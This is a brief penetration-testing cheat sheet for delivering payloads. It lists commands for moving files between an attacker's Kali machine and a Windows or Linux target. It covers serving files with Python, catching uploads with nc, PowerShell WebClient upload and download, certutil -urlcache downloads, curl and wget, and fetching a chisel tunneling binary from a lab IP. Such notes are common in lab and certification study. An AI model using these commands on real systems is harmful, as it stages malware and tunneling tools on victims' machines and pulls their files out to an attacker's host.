Delivery of Payload 
Transfering File
===============================================================================================
		M1.  HTTP Transfer - Linux as HTTP server
		# On Server Host (Your Kali) SENDER
		$ python3 -m http.server 8080           # Linux/Window with Python
		# Transfer Payload Window -> Kali
        $ sudo nc -lvnp 8080 > payload.exe    # On Kali (start HTTP listener) | # -l: Listen | -v: Verbose | -p: Port | -n: No DNS resolution
        PS:> $wc = New-Object System.Net.WebClient    # On Windows (send/Upload the file) 
        PS:> $wc.UploadFile("http://<kali-ip>:8080", "C:\Path\To\payload.exe")    # On Windows (send/Upload the file) | This Method writes POST info metadata to the payload, only good to deliver text file.
        PS:> $wc.UploadString("http://<kali-ip>:8080", [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Path\To\payload.exe")))    # On Windows (send/Upload the file) | This Method encode to base64 but still add Metadata to payload
        		# On Client Host (Target) RECEIVER
        		PS:> (New-Object Net.WebClient).DownloadFile('http://<Server_IP>:8080/payload.exe', 'C:\Users\Public\Payload.exe')		# Window Client - Works
		PS:> Invoke-WebRequest -Uri "http://<Server_ip>:8080/payload.exe" -OutFile "C:\Users\Public\payload.exe"       # Window Client - Works
		PS:> iwr -Uri "http://10.10.14.22:8080/chisel_1.7.7_windows_amd64" -OutFile "C:\Tools\chisel.exe"
		OR
		> certutil -urlcache -split -f http://<Server_ip>:8080/payload.exe C:\OutPut\Path\payload.exe     # Window Client | -split download in chunks | -f 	force overwrite - Works
		OR
		$ curl http://<server_ip>:<port>/payload.bin -o payload.bin    # Linux Client
		$ wget http://<server_ip>:<port>/payload.bin -O payload.bin    # Linux Client
